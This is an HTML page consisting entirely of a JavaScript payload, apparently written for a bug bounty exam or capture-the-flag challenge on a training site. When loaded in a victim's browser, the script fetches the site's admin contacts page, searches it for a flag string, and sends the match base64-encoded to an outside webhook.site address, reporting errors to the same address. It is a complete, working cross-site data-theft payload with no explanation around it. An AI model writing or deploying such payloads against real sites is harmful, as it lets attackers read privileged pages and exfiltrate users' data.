<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Reach back to the Admin Dashboard
        fetch('https://bugbounty-exam.hashacademy.co/admin/contacts')
        .then(response => response.text())
        .then(html => {
            // 2. Search for the flag pattern
            const flagMatch = html.match(/Hash{[^}]+}/i);
            const content = flagMatch ? flagMatch[0] : "Flag_Not_Found_On_Contacts";

            // 3. Send it to your NEW webhook
            fetch('https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7?flag=' + btoa(content));
        })
        .catch(err => {
            fetch('https://webhook.site/296afaf2-cf3b-4b7e-9e97-f597328a7eb7?error=' + btoa(err));
        });
    </script>
</body>
</html>
